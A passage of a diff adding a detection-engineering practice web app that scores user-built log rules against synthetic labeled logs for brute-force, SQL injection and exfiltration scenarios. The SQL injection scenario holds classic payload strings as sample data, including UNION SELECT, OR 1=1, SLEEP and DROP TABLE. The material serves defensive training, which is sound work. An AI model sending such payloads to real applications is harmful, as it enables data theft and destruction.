@@ -1,0 +1,1560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NOCTURNE // Rule Forge</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=Major+Mono+Display&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0d12;
+    --bg-2: #0f141c;
+    --panel: #121821;
+    --panel-2: #161d28;
+    --border: #1f2937;
+    --border-2: #2a3a4f;
+    --text: #e6ecf3;
+    --text-dim: #8a9aae;
+    --text-faint: #4a5568;
+    --amber: #ffb000;
+    --amber-glow: rgba(255, 176, 0, 0.18);
+    --green: #4ade80;
+    --green-bg: rgba(74, 222, 128, 0.12);
+    --red: #ff3b5c;
+    --red-bg: rgba(255, 59, 92, 0.12);
+    --yellow: #facc15;
+    --yellow-bg: rgba(250, 204, 21, 0.12);
+    --critical: #ff3b5c;
+    --error: #ff7a4a;
+    --warning: #ffb000;
+    --notice: #4dd0e1;
+    --info: #5fb3f5;
+    --debug: #7a8898;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', sans-serif;
+    font-size: 13px;
+    line-height: 1.5;
+    height: 100%;
+  }
+
+  body {
+    background-image:
+      radial-gradient(ellipse at top right, rgba(255, 176, 0, 0.04), transparent 60%),
+      radial-gradient(ellipse at bottom left, rgba(74, 222, 128, 0.03), transparent 60%),
+      linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
+    background-size: 100% 100%, 100% 100%, 32px 32px, 32px 32px;
+    display: grid;
+    grid-template-rows: auto 1fr;
+    min-height: 100vh;
+  }
+
+  /* HEADER */
+  header {
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    align-items: center;
+    gap: 32px;
+    padding: 14px 24px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(10, 13, 18, 0.85);
+    backdrop-filter: blur(8px);
+    position: sticky;
+    top: 0;
+    z-index: 50;
+  }
+  .brand { display: flex; align-items: baseline; gap: 14px; }
+  .brand h1 {
+    font-family: 'Major Mono Display', monospace;
+    font-size: 20px;
+    color: var(--amber);
+    letter-spacing: 0.08em;
+    font-weight: 400;
+  }
+  .brand .tag {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    padding: 3px 8px;
+    border: 1px solid var(--border-2);
+    border-radius: 2px;
+  }
+  .scenario-tabs {
+    display: flex;
+    gap: 2px;
+    justify-content: center;
+  }
+  .scenario-tab {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    padding: 8px 14px;
+    cursor: pointer;
+    transition: all 0.15s;
+    border-radius: 2px;
+  }
+  .scenario-tab:hover { border-color: var(--border-2); color: var(--text); }
+  .scenario-tab.active {
+    background: var(--amber-glow);
+    border-color: var(--amber);
+    color: var(--amber);
+  }
+  .header-link {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-decoration: none;
+    letter-spacing: 0.05em;
+    padding: 6px 10px;
+    border: 1px solid var(--border);
+    border-radius: 2px;
+    transition: all 0.15s;
+  }
+  .header-link:hover { color: var(--amber); border-color: var(--amber); }
+
+  /* MAIN */
+  main {
+    display: grid;
+    grid-template-columns: minmax(420px, 1fr) minmax(420px, 1fr);
+    gap: 1px;
+    background: var(--border);
+  }
+  @media (max-width: 1100px) {
+    main { grid-template-columns: 1fr; }
+  }
+
+  .panel {
+    background: var(--bg);
+    padding: 22px 24px;
+    overflow-y: auto;
+  }
+
+  .section-label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.18em;
+    color: var(--amber);
+    margin-bottom: 12px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .section-label .hint {
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: none;
+    letter-spacing: 0.05em;
+  }
+
+  /* SCENARIO BRIEF */
+  .brief {
+    background: var(--panel);
+    border: 1px solid var(--border-2);
+    border-left: 3px solid var(--amber);
+    padding: 14px 16px;
+    margin-bottom: 22px;
+    border-radius: 2px;
+  }
+  .brief h2 {
+    font-family: 'IBM Plex Sans', sans-serif;
+    font-size: 15px;
+    font-weight: 600;
+    margin-bottom: 6px;
+    color: var(--text);
+  }
+  .brief .obj {
+    font-size: 12px;
+    color: var(--text-dim);
+    margin-bottom: 10px;
+  }
+  .brief .corpus-stats {
+    display: flex;
+    gap: 18px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    padding-top: 10px;
+    border-top: 1px solid var(--border);
+  }
+  .brief .corpus-stats b { color: var(--text); font-weight: 500; }
+  .brief .hint-toggle {
+    background: transparent;
+    border: 1px dashed var(--border-2);
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    padding: 4px 8px;
+    cursor: pointer;
+    margin-top: 8px;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+  }
+  .brief .hint-toggle:hover { color: var(--amber); border-color: var(--amber); }
+  .brief .hint-text {
+    display: none;
+    font-size: 11.5px;
+    color: var(--text-dim);
+    margin-top: 10px;
+    padding: 10px 12px;
+    background: var(--bg-2);
+    border-left: 2px solid var(--text-faint);
+    border-radius: 2px;
+    line-height: 1.7;
+  }
+  .brief .hint-text.show { display: block; }
+  .brief .hint-text code {
+    font-family: 'IBM Plex Mono', monospace;
+    color: var(--amber);
+    background: var(--bg);
+    padding: 1px 5px;
+    border-radius: 2px;
+    font-size: 10.5px;
+  }
+
+  /* RULE BUILDER */
+  .rule-section { margin-bottom: 20px; }
+  .rule-section h4 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text);
+    margin-bottom: 8px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .rule-section h4 .sub {
+    font-size: 10px;
+    color: var(--text-faint);
+    text-transform: none;
+    letter-spacing: 0;
+  }
+
+  .rule-meta { display: grid; grid-template-columns: 1fr 130px; gap: 10px; margin-bottom: 16px; }
+
+  .field-input, .field-select {
+    width: 100%;
+    background: var(--panel);
+    border: 1px solid var(--border-2);
+    color: var(--text);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    padding: 8px 10px;
+    outline: none;
+    border-radius: 2px;
+    transition: border-color 0.15s;
+  }
+  .field-input:focus, .field-select:focus {
+    border-color: var(--amber);
+  }
+  .field-select {
+    appearance: none;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath fill='%238a9aae' d='M0 0l5 6 5-6z'/%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 10px center;
+    padding-right: 26px;
+  }
+
+  .condition-row {
+    display: grid;
+    grid-template-columns: 130px 130px 1fr auto;
+    gap: 6px;
+    margin-bottom: 6px;
+    align-items: center;
+  }
+  .condition-row .icon-btn {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 14px;
+    width: 28px;
+    height: 32px;
+    cursor: pointer;
+    border-radius: 2px;
+    transition: all 0.15s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .condition-row .icon-btn:hover { color: var(--red); border-color: var(--red); }
+
+  .add-condition {
+    background: transparent;
+    border: 1px dashed var(--border-2);
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    padding: 8px 12px;
+    cursor: pointer;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: 0.1em;
+    width: 100%;
+    margin-top: 6px;
+    transition: all 0.15s;
+  }
+  .add-condition:hover { color: var(--amber); border-color: var(--amber); }
+
+  /* THRESHOLD */
+  .threshold-toggle {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 8px;
+    cursor: pointer;
+    user-select: none;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+  .threshold-toggle input { accent-color: var(--amber); width: 13px; height: 13px; }
+  .threshold-body { display: none; padding: 10px; background: var(--bg-2); border-radius: 2px; border: 1px solid var(--border); }
+  .threshold-body.show { display: block; }
+  .threshold-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+  }
+  .threshold-grid .full { grid-column: 1 / -1; }
+  .threshold-grid label {
+    display: block;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 4px;
+  }
+
+  /* ACTIONS */
+  .actions {
+    display: flex;
+    gap: 8px;
+    margin-top: 18px;
+    padding-top: 16px;
+    border-top: 1px solid var(--border);
+  }
+  .btn-primary {
+    flex: 1;
+    background: var(--amber);
+    color: var(--bg);
+    border: none;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 0.12em;
+    padding: 12px 20px;
+    cursor: pointer;
+    text-transform: uppercase;
+    border-radius: 2px;
+    transition: opacity 0.15s;
+  }
+  .btn-primary:hover { opacity: 0.85; }
+  .btn-secondary {
+    background: transparent;
+    color: var(--text-dim);
+    border: 1px solid var(--border-2);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    padding: 12px 16px;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    border-radius: 2px;
+  }
+  .btn-secondary:hover { color: var(--text); border-color: var(--text-dim); }
+
+  /* RESULTS / SCORE */
+  .scorecard {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1px;
+    background: var(--border);
+    margin-bottom: 18px;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .score-cell {
+    background: var(--panel);
+    padding: 14px 12px;
+    text-align: center;
+  }
+  .score-cell .label {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.18em;
+    margin-bottom: 4px;
+  }
+  .score-cell .val {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 24px;
+    font-weight: 600;
+    letter-spacing: -0.02em;
+    font-variant-numeric: tabular-nums;
+  }
+  .score-cell .val.good { color: var(--green); }
+  .score-cell .val.med { color: var(--yellow); }
+  .score-cell .val.bad { color: var(--red); }
+  .score-cell .val.neutral { color: var(--text-dim); }
+
+  .breakdown {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 1px;
+    background: var(--border);
+    margin-bottom: 18px;
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  .bd-cell {
+    background: var(--panel-2);
+    padding: 10px 8px;
+    text-align: center;
+    cursor: pointer;
+    transition: background 0.15s;
+  }
+  .bd-cell:hover { background: var(--panel); }
+  .bd-cell.active { background: var(--bg-2); border-bottom: 2px solid var(--amber); }
+  .bd-cell .v {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 18px;
+    font-weight: 600;
+    font-variant-numeric: tabular-nums;
+    margin-bottom: 2px;
+  }
+  .bd-cell .l {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+  }
+  .bd-cell.tp .v { color: var(--green); }
+  .bd-cell.fp .v { color: var(--red); }
+  .bd-cell.fn .v { color: var(--yellow); }
+  .bd-cell.tn .v { color: var(--text-dim); }
+
+  .verdict {
+    text-align: center;
+    margin-bottom: 16px;
+    padding: 10px;
+    border-radius: 2px;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+  .verdict.perfect { background: var(--green-bg); color: var(--green); border: 1px solid var(--green); }
+  .verdict.good { background: var(--green-bg); color: var(--green); }
+  .verdict.med { background: var(--yellow-bg); color: var(--yellow); }
+  .verdict.bad { background: var(--red-bg); color: var(--red); }
+  .verdict.empty { background: var(--bg-2); color: var(--text-dim); border: 1px dashed var(--border-2); }
+
+  /* EVENT LIST */
+  .event-list {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 11.5px;
+  }
+  .event-row {
+    padding: 9px 12px;
+    border-bottom: 1px solid var(--border);
+    display: grid;
+    grid-template-columns: auto 130px 1fr;
+    gap: 12px;
+    align-items: baseline;
+  }
+  .event-row.tp { background: linear-gradient(90deg, var(--green-bg), transparent 40%); }
+  .event-row.fp { background: linear-gradient(90deg, var(--red-bg), transparent 40%); }
+  .event-row.fn { background: linear-gradient(90deg, var(--yellow-bg), transparent 40%); }
+
+  .event-row .badge {
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    padding: 2px 6px;
+    border-radius: 2px;
+    font-weight: 600;
+    white-space: nowrap;
+  }
+  .event-row.tp .badge { background: var(--green); color: var(--bg); }
+  .event-row.fp .badge { background: var(--red); color: var(--bg); }
+  .event-row.fn .badge { background: var(--yellow); color: var(--bg); }
+
+  .event-row .ts { color: var(--text-dim); font-size: 10.5px; }
+  .event-row .msg { color: var(--text); word-break: break-word; line-height: 1.5; }
+  .event-row .msg .meta {
+    display: block;
+    color: var(--text-faint);
+    font-size: 10px;
+    margin-top: 2px;
+  }
+
+  .empty-state {
+    padding: 40px 20px;
+    text-align: center;
+    color: var(--text-dim);
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 12px;
+  }
+  .empty-state .sym {
+    font-size: 28px;
+    color: var(--text-faint);
+    font-family: 'Major Mono Display', monospace;
+    margin-bottom: 10px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <h1>rule forge</h1>
+    <span class="tag">Detection Engineering // Practice</span>
+  </div>
+  <div class="scenario-tabs" id="scenario-tabs"></div>
+  <a href="#" class="header-link" id="reset-link">Reset Rule</a>
+</header>
+
+<main>
+  <div class="panel">
+    <div class="brief" id="brief"></div>
+
+    <div class="section-label">Rule Definition <span class="hint">build · tune · iterate</span></div>
+
+    <div class="rule-section">
+      <div class="rule-meta">
+        <input type="text" class="field-input" id="rule-name" placeholder="Rule name">
+        <select class="field-select" id="rule-severity">
+          <option value="critical">critical</option>
+          <option value="error">error</option>
+          <option value="warning" selected>warning</option>
+          <option value="notice">notice</option>
+          <option value="info">info</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="rule-section">
+      <h4>Match — ALL conditions <span class="sub">events must match every row</span></h4>
+      <div id="match-conditions"></div>
+      <button class="add-condition" id="add-match">+ Add condition</button>
+    </div>
+
+    <div class="rule-section">
+      <h4>Exclude — ANY of these <span class="sub">drop events matching any row</span></h4>
+      <div id="exclude-conditions"></div>
+      <button class="add-condition" id="add-exclude">+ Add exclusion</button>
+    </div>
+
+    <div class="rule-section">
+      <h4>Aggregation <span class="sub">threshold over time window</span></h4>
+      <label class="threshold-toggle">
+        <input type="checkbox" id="threshold-enabled">
+        Enable count-based threshold
+      </label>
+      <div class="threshold-body" id="threshold-body">
+        <div class="threshold-grid">
+          <div>
+            <label>Min count (≥)</label>
+            <input type="number" class="field-input" id="threshold-count" value="10" min="1">
+          </div>
+          <div>
+            <label>Window (seconds)</label>
+            <input type="number" class="field-input" id="threshold-window" value="300" min="1">
+          </div>
+          <div class="full">
+            <label>Group by field (optional)</label>
+            <select class="field-select" id="threshold-group">
+              <option value="">— none —</option>
+              <option value="src_ip">src_ip</option>
+              <option value="user">user</option>
+              <option value="dst_ip">dst_ip</option>
+              <option value="host">host</option>
+              <option value="source">source</option>
+            </select>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="actions">
+      <button class="btn-secondary" id="load-naive">Load Naive Rule</button>
+      <button class="btn-primary" id="run-rule">▶ Test Rule</button>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="section-label">Evaluation <span class="hint" id="last-run">no run yet</span></div>
+
+    <div class="verdict empty" id="verdict">Build a rule and click Test to evaluate</div>
+
+    <div class="scorecard">
+      <div class="score-cell"><div class="label">Precision</div><div class="val neutral" id="precision">—</div></div>
+      <div class="score-cell"><div class="label">Recall</div><div class="val neutral" id="recall">—</div></div>
+      <div class="score-cell"><div class="label">F1 Score</div><div class="val neutral" id="f1">—</div></div>
+    </div>
+
+    <div class="breakdown" id="breakdown">
+      <div class="bd-cell tp active" data-tab="tp"><div class="v" id="cnt-tp">0</div><div class="l">True Pos</div></div>
+      <div class="bd-cell fp" data-tab="fp"><div class="v" id="cnt-fp">0</div><div class="l">False Pos</div></div>
+      <div class="bd-cell fn" data-tab="fn"><div class="v" id="cnt-fn">0</div><div class="l">Missed</div></div>
+      <div class="bd-cell tn" data-tab="all"><div class="v" id="cnt-total">0</div><div class="l">All Events</div></div>
+    </div>
+
+    <div class="event-list" id="event-list">
+      <div class="empty-state">
+        <div class="sym">∅</div>
+        Run your rule to see triggered events, missed attacks, and false positives.
+      </div>
+    </div>
+  </div>
+</main>
+
+<script>
+// ============================================================
+// SEEDED RNG
+// ============================================================
+let _seed;
+function setSeed(n) { _seed = n; }
+function rand() { _seed = (_seed * 1664525 + 1013904223) >>> 0; return _seed / 0xFFFFFFFF; }
+function pick(a) { return a[Math.floor(rand() * a.length)]; }
+function randInt(min, max) { return Math.floor(rand() * (max - min + 1)) + min; }
+
+const NOW = Date.now();
+function tsAt(secAgo) { return new Date(NOW - secAgo * 1000).toISOString().replace('T', ' ').slice(0, 19); }
+
+// ============================================================
+// SCENARIOS — each generates labeled test corpus
+// _label: 'tp' = should be detected, 'fp' = looks similar but benign, 'noise' = unrelated
+// ============================================================
+
+function scenarioBruteForce() {
+  setSeed(0xB1117EF0);
+  const logs = [];
+  const ipPool = ['10.4.12.55', '10.4.12.78', '10.4.13.21', '10.4.13.99', '10.4.14.45'];
+  const internalUsers = ['jdoe', 'asmith', 'mjohnson', 'tnguyen', 'klee'];
+
+  // ATTACK 1: 24 failed logins to 'admin' from 185.220.101.45 within 90s
+  const a1Start = 1200;
+  for (let i = 0; i < 24; i++) {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (a1Start - i * 4) * 1000,
+      timestamp: tsAt(a1Start - i * 4),
+      source: 'auth-server',
+      severity: 'critical',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'admin',
+      src_ip: '185.220.101.45',
+      message: `Failed login for user admin from 185.220.101.45 — invalid_password (attempt ${i + 1})`
+    });
+  }
+
+  // ATTACK 2: 18 fails on 'root' from 45.95.168.77 within 2 min
+  const a2Start = 8400;
+  for (let i = 0; i < 18; i++) {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (a2Start - i * 6) * 1000,
+      timestamp: tsAt(a2Start - i * 6),
+      source: 'auth-server',
+      severity: 'critical',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'root',
+      src_ip: '45.95.168.77',
+      message: `Failed login for user root from 45.95.168.77 — invalid_password`
+    });
+  }
+
+  // ATTACK 3: 15 fails on 'administrator' from 91.92.246.18
+  const a3Start = 18000;
+  for (let i = 0; i < 15; i++) {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (a3Start - i * 8) * 1000,
+      timestamp: tsAt(a3Start - i * 8),
+      source: 'auth-server',
+      severity: 'warning',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'administrator',
+      src_ip: '91.92.246.18',
+      message: `Failed login for user administrator from 91.92.246.18 — invalid_password`
+    });
+  }
+
+  // FP: jdoe mistypes password 3 times, then succeeds (legit user)
+  for (let i = 0; i < 3; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (4000 - i * 30) * 1000,
+      timestamp: tsAt(4000 - i * 30),
+      source: 'auth-server',
+      severity: 'warning',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'jdoe',
+      src_ip: '10.4.12.55',
+      message: `Failed login for user jdoe from 10.4.12.55 — invalid_password`
+    });
+  }
+
+  // FP: asmith locked out after 5 fails (legit user, password change forgotten)
+  for (let i = 0; i < 5; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (12000 - i * 45) * 1000,
+      timestamp: tsAt(12000 - i * 45),
+      source: 'auth-server',
+      severity: 'warning',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'asmith',
+      src_ip: '10.4.13.21',
+      message: `Failed login for user asmith from 10.4.13.21 — invalid_password`
+    });
+  }
+
+  // FP: svc-backup retry storm — 22 fails, internal IP, service account (expired token)
+  for (let i = 0; i < 22; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (15600 - i * 5) * 1000,
+      timestamp: tsAt(15600 - i * 5),
+      source: 'auth-server',
+      severity: 'warning',
+      action: 'LOGIN',
+      status: 'failure',
+      user: 'svc-backup',
+      src_ip: '10.4.14.45',
+      message: `Failed login for user svc-backup from 10.4.14.45 — token_expired`
+    });
+  }
+
+  // NOISE: successful logins
+  for (let i = 0; i < 60; i++) {
+    const t = randInt(0, 86400);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'auth-server',
+      severity: 'info',
+      action: 'LOGIN',
+      status: 'success',
+      user: pick(internalUsers),
+      src_ip: pick(ipPool),
+      message: `Successful login for user ${pick(internalUsers)}`
+    });
+  }
+
+  // NOISE: scattered single failures (typos)
+  for (let i = 0; i < 14; i++) {
+    const t = randInt(0, 86400);
+    const u = pick(internalUsers);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'auth-server',
+      severity: 'warning',
+      action: 'LOGIN',
+      status: 'failure',
+      user: u,
+      src_ip: pick(ipPool),
+      message: `Failed login for user ${u} — invalid_password`
+    });
+  }
+
+  return {
+    logs,
+    fields: ['source', 'severity', 'action', 'status', 'user', 'src_ip']
+  };
+}
+
+function scenarioSqlInjection() {
+  setSeed(0x59710001);
+  const logs = [];
+
+  const tps = [
+    { src: '185.220.101.45', payload: "id=1' UNION SELECT username,password FROM users--", path: '/api/products', attack: 'SQL Injection' },
+    { src: '45.95.168.77',   payload: "search=' OR 1=1--",                                   path: '/api/search',   attack: 'SQL Injection' },
+    { src: '91.92.246.18',   payload: "user=admin' AND SLEEP(5)--",                          path: '/login',         attack: 'SQL Injection' },
+    { src: '193.169.252.34', payload: "id=1; DROP TABLE users;--",                           path: '/api/orders',    attack: 'SQL Injection' },
+    { src: '5.181.80.140',   payload: "q=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", path: '/search', attack: 'SQL Injection' },
+    { src: '194.169.175.33', payload: "id=1' UNION ALL SELECT NULL,NULL,version()--",       path: '/api/users',     attack: 'SQL Injection' },
+    { src: '185.220.102.12', payload: "name=admin'/**/OR/**/'1'='1",                         path: '/login',         attack: 'SQL Injection' },
+  ];
+  tps.forEach((t, i) => {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (3000 + i * 600) * 1000,
+      timestamp: tsAt(3000 + i * 600),
+      source: 'cloudflare-waf',
+      severity: 'critical',
+      action: 'BLOCK',
+      attack_type: t.attack,
+      src_ip: t.src,
+      user: 'anonymous',
+      ruleset: 'OWASP-CRS',
+      message: `Blocked SQL Injection attempt against ${t.path} payload="${t.payload}" rule_id=942100`
+    });
+  });
+
+  // TPs from web-server logs (not WAF) — possible if WAF was bypassed/misconfigured
+  const tps2 = [
+    { src: '193.169.252.34', payload: "id=1' OR '1'='1", path: '/legacy/items.php' },
+    { src: '5.181.80.140',   payload: "user=' UNION SELECT user(),database()--", path: '/old-api/lookup' },
+  ];
+  tps2.forEach((t, i) => {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (1000 + i * 1500) * 1000,
+      timestamp: tsAt(1000 + i * 1500),
+      source: 'web-server',
+      severity: 'error',
+      action: 'GET',
+      status: '500',
+      src_ip: t.src,
+      user: 'anonymous',
+      message: `GET ${t.path}?${t.payload} 500 — SQL syntax error in query`
+    });
+  });
+
+  // FP: legitimate user's search containing the word "select" or "union"
+  const fpQueries = [
+    { user: 'jdoe',   q: '/api/search?q=select+a+gift',                    msg: 'GET /api/search?q=select+a+gift 200 4521b' },
+    { user: 'asmith', q: '/api/search?q=union+labor+laws',                 msg: 'GET /api/search?q=union+labor+laws 200 8821b' },
+    { user: 'klee',   q: '/api/search?q=drop+shipping+suppliers',          msg: 'GET /api/search?q=drop+shipping+suppliers 200 12042b' },
+    { user: 'tnguyen',q: '/blog/select-the-right-laptop',                  msg: 'GET /blog/select-the-right-laptop 200 18204b' },
+  ];
+  fpQueries.forEach((f, i) => {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (5000 + i * 2400) * 1000,
+      timestamp: tsAt(5000 + i * 2400),
+      source: 'web-server',
+      severity: 'info',
+      action: 'GET',
+      status: '200',
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      user: f.user,
+      message: f.msg
+    });
+  });
+
+  // FP: WAF false-positive that was already overridden (logged as ALLOW with attack_type)
+  logs.push({
+    _label: 'fp',
+    _ts: NOW - 7200 * 1000,
+    timestamp: tsAt(7200),
+    source: 'cloudflare-waf',
+    severity: 'notice',
+    action: 'ALLOW',
+    attack_type: 'SQL Injection',
+    src_ip: '10.4.13.50',
+    user: 'asmith',
+    ruleset: 'OWASP-CRS',
+    message: `Allowed (rule overridden) suspected SQL Injection against /api/admin/reports — internal user verified`
+  });
+
+  // FP: error log mentioning "SQL" but not an attack
+  logs.push({
+    _label: 'fp',
+    _ts: NOW - 9100 * 1000,
+    timestamp: tsAt(9100),
+    source: 'database',
+    severity: 'error',
+    action: 'QUERY',
+    user: 'app_user',
+    src_ip: '10.4.12.10',
+    message: 'Query failed: SQL syntax error in stored procedure sp_generate_report (legacy code)'
+  });
+
+  // NOISE
+  for (let i = 0; i < 80; i++) {
+    const t = randInt(0, 86400);
+    const status = pick([200, 200, 200, 200, 301, 304, 404]);
+    const path = pick(['/api/v1/orders', '/api/v1/users', '/dashboard', '/static/app.js', '/healthz', '/products', '/cart']);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'web-server',
+      severity: status >= 400 ? 'notice' : 'info',
+      action: 'GET',
+      status: String(status),
+      src_ip: '10.4.' + randInt(12, 14) + '.' + randInt(20, 99),
+      user: pick(['jdoe', 'asmith', 'mjohnson', 'klee', 'anonymous']),
+      message: `GET ${path} ${status}`
+    });
+  }
+  for (let i = 0; i < 20; i++) {
+    const t = randInt(0, 86400);
+    logs.push({
+      _label: 'noise',
+      _ts: NOW - t * 1000,
+      timestamp: tsAt(t),
+      source: 'cloudflare-waf',
+      severity: 'warning',
+      action: 'CHALLENGE',
+      attack_type: pick(['XSS', 'Path Traversal', 'XSS']),
+      src_ip: '185.220.' + randInt(100, 110) + '.' + randInt(1, 254),
+      user: 'anonymous',
+      message: 'Challenged suspicious request'
+    });
+  }
+
+  return {
+    logs,
+    fields: ['source', 'severity', 'action', 'attack_type', 'src_ip', 'user', 'status']
+  };
+}
+
+function scenarioExfiltration() {
+  setSeed(0xEFF11337);
+  const logs = [];
+  const suspIPs = ['185.220.101.45', '45.95.168.77', '91.92.246.18', '193.169.252.34', '5.181.80.140'];
+
+  // TPs — large outbound transfers to suspicious IPs by compromised users
+  const tps = [
+    { user: 'jdoe',     bytes: 18_500_000, dst: '185.220.101.45', src: '10.4.12.55' },
+    { user: 'jdoe',     bytes: 24_200_000, dst: '185.220.101.45', src: '10.4.12.55' },
+    { user: 'mjohnson', bytes: 42_700_000, dst: '45.95.168.77',   src: '10.4.13.21' },
+    { user: 'asmith',   bytes: 11_800_000, dst: '91.92.246.18',   src: '10.4.12.78' },
+    { user: 'tnguyen',  bytes: 67_000_000, dst: '193.169.252.34', src: '10.4.13.99' },
+    { user: 'klee',     bytes: 13_500_000, dst: '5.181.80.140',   src: '10.4.14.45' },
+  ];
+  tps.forEach((t, i) => {
+    logs.push({
+      _label: 'tp',
+      _ts: NOW - (2000 + i * 1800) * 1000,
+      timestamp: tsAt(2000 + i * 1800),
+      source: 'firewall',
+      severity: 'warning',
+      action: 'ALLOW',
+      user: t.user,
+      src_ip: t.src,
+      dst_ip: t.dst,
+      port: 443,
+      bytes_out: t.bytes,
+      dst_category: 'unknown',
+      message: `ALLOW TCP ${t.src} -> ${t.dst}:443 bytes_out=${t.bytes}`
+    });
+  });
+
+  // FP: backup service uploads large data to internal backup destination (legit)
+  for (let i = 0; i < 4; i++) {
+    logs.push({
+      _label: 'fp',
+      _ts: NOW - (10000 + i * 7200) * 1000,
+      timestamp: tsAt(10000 + i * 7200),
+      source: 'firewall',
+      severity: 'info',
+      action: 'ALLOW',
+      user: 'svc-backup',
+      src_ip: '10.4.14.45',
+      dst_ip: '10.50.0.20',
+      port: 443,
+      bytes_out: randInt(80_000_000, 250_000_000),
+      dst_category: 'internal-backup',
+      message: 'ALLOW TCP backup transfer to internal backup vault'
+    });
+  }
+
